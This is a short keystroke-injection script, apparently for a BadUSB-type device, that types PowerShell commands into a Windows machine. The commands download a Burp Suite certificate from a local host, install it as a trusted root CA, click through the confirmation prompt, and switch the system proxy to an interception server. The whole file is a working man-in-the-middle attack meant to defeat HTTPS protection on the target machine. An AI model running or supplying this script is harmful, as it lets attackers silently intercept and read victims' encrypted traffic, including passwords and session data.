/* windows_mitm_proxy.js
 * Installs the specified Root CA and sets windows to use the proxy specified. 
 * It's not the most reliable in my experience but does work. 
 * I will work on it and try to improve reliability especially around the acceptance
 * of the root CA cert.
 */
proxyServer = '192.168.0.15:8080'
certificatURL = 'http://192.168.0.15:9000/burp_cert.der'

layout('us')
typingSpeed(1, 2);

// Open powershell
press("GUI r")
delay(500)
type("powershell\n")
delay(1000)

// Download and import and root CA
type('$regKey="HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"')
press("ENTER")
type('$proxy="' + proxyServer + '"')
press("ENTER")
type('$certFileURL="' + certificatURL + '"')
press("ENTER")
type('$tempFile = New-TemporaryFile')
press("ENTER")
type('Invoke-WebRequest -Uri $certFileURL -OutFile $tempFile')
press("ENTER")
// Wait for the download
delay(1000)

// Import cert
type('$certfile = (Get-ChildItem -Path $tempFile)')
press("ENTER")
type('$certfile | Import-Certificate -CertStoreLocation cert:\\CurrentUser\\Root')
press("ENTER")

// Wait for the import certificate confirmation
delay(2000)

// Move to ok and select it
press('GUI TAB')
delay(1000)
press('GUI TAB')
delay(1000)
press('LEFT')
delay(100)
press('ENTER')
delay(1000)
press('ENTER')

// Continue setting the CA reg key
type('Set-ItemProperty -path $regKey ProxyEnable -value 1')
press("ENTER")
type('Set-ItemProperty -path $regKey ProxyServer -value $proxy')
press("ENTER")

// Quit powershell
type('exit')
press('ENTER')

